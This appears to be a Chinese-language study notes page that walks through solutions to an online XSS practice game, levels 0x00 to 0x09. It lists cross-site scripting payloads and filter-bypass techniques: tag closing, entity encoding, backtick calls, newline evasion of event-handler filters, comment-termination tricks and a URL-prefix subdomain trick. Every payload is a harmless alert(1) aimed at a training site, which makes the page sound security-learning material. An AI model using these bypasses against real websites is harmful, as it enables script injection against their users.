---
layout: page
title: "XSS"
date: 2019-10-29 01:01
---

## 实验平台
https://curtails.github.io/xss/
https://xss.haozi.me

## XSS绕过方法总结
`<scirpt>`
```js
<script>alert(1)</script>
<script>alert(1);</script>
<script>alert("1")</script>
```

## xss-demo
[github](https://github.com/haozi/xss-demo/)

[在线地址](https://xss.haozi.me)

拼凑所需语句即可不必关心原语句完整性？？浏览器容错性？？
- 0x00 `<script>alert(1)</script>` 无任何过滤
- 0x01 `</textarea><script>alert(1)</script>`闭合标签
- 0x02 `"> <script>alert(1)</script>`闭合标签
- 0x03 

```js
<script>alert`1`</script>
<svg><script>alert&#40;1&#41</script>
``` 

正则表达式过滤() 用``绕过或实体编码的字符编码
- 0x04 同0x03 

```js
<svg><script>alert&#40;1&#41</script>
<iframe onload=alert&#40;1&#41></iframe>
```
- 0x05
将-->替换成😀 html注释`<!--xxs--->`或`<!--xss--!>`
payload:`--!> <script>alert(1)</script>`

- 0x06
过滤`auto*****=`或`on*****=`替换为_ 可用换行符绕过

```js
onmousemove
=alert(1)

type=image src onerror
=alert(1)
```
- 0x07
匹配<***>字符串忽略大小写替换为空

```js
<svg/onload=alert(1) //有空格
```

- 0x08
将`</style>`替换成`/*坏人*/` 在标签>之前加个空格或换行就好了

```js
</style ><script>alert(1)</script>
</style
><script>alert(1)</script>
```

- 0x09
输入要以https://www.segmentfault.com开头 有一种payload是在网站上存在alert(1)js脚本

```js
https://www.segmentfault.com.haozi.me/j.js
```
